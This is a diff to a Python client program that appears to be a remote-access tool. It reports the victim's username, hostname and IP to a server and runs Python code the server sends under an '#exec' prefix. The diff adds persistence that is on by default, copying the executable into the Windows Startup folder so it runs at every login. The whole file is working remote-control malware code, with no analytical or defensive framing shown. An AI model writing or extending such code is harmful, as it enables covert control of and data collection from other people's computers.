@@ -4,6 +4,7 @@ import platform
 import requests
 import getpass
 import socket
+import shutil
 import time
 import sys
 import os
@@ -11,8 +12,18 @@ import os
 server_host = "127.0.0.1"
 server_port = 65535
 reconnect_delay = 10
+copy_to_startup = True  # True/False
 ip_api_url = "https://ipinfo.io/json"
 
+def copy_executable_to_startup():
+    try:
+        if platform.system() == "Windows":
+            startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            shutil.copy(sys.executable, startup_folder_path)
+        else:
+            print("OS isnt supported for copying to startup")
+    except Exception as e:
+        print(f"Error: {e}")
 
 def connect_server():
     global client_socket
@@ -40,7 +51,7 @@ def get_client_info():
 
         public_ip = data.get("ip")
         local_ip = socket.gethostbyname(socket.gethostname())
-        ip = f"{public_ip}/{local_ip}"
+        ip = f"{local_ip}"
 
         username = getpass.getuser()
         hostname = socket.gethostname()
@@ -74,7 +85,6 @@ def client():
                 print(f"[{datetime.now():%X}] RECEIVE {data}")
 
                 client_port = client_socket.getsockname()[1]
-                print(ip.split("/")[0], client_port)
                 if decoded_data.startswith("#exec\n") or decoded_data.startswith(f"#exec {ip.split("/")[0]}:{client_port}\n"):
                     try:
                         output_capture = StringIO()
@@ -101,4 +111,7 @@ def client():
 
 
 if __name__ == "__main__":
+    if copy_to_startup is True:
+        copy_executable_to_startup()
+
     client()
